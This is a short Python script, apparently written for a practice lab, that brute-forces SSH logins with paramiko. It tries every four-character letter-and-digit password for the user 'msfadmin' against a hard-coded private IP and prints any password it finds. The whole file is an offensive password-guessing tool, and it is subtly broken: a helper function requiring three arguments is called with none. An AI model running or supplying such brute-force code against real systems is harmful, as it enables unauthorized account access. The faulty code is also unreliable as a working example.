
import itertools as it
import string
import paramiko


def create_client(ip, username, password):
    client = paramiko.SSHClient()
    client_policy = paramiko.AutoAddPolicy()
    client.set_missing_host_key_policy(client_policy)
    return client

class Brute:
    def __init__(self, charset, length, ip):
        self.charset = charset
        self.length = length
        self.ip = ip


    def crack(self, username):
        client = create_client()
        for g in self.guesses:
            try:
                client.connect(self.ip, username=username, password=g, timeout=0.5)
                return g
            except paramiko.AuthenticationException as e:
                pass
            finally:
                client.close()

    
    @property
    def guesses(self):
        for g in it.product(self.charset, repeat=self.length):
            yield ''.join(g) 




def main():
    charset = string.ascii_letters + string.digits
    ip = '10.176.182.98'
    brute = Brute(charset, 4, ip)
    password = brute.crack(username='msfadmin')
    if password:
        print('[+] FOUND {}'.format(password))



if __name__ == '__main__':
    main()











